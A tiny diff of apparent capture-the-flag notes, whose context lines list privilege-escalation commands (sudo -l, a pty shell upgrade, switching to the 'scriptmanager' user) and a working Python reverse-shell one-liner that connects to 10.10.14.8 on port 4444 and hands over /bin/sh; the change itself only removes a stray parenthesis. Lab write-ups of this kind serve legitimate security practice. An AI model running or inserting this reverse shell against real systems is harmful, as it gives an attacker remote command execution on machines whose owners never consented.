@@ -7,7 +7,7 @@ sudo -l
 python3 -c "import pty;pty.spawn('/bin/bash')"
 sudo -u scriptmanager bash -i
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-python -c shell.py)
+python -c shell.py
 ```
 
 
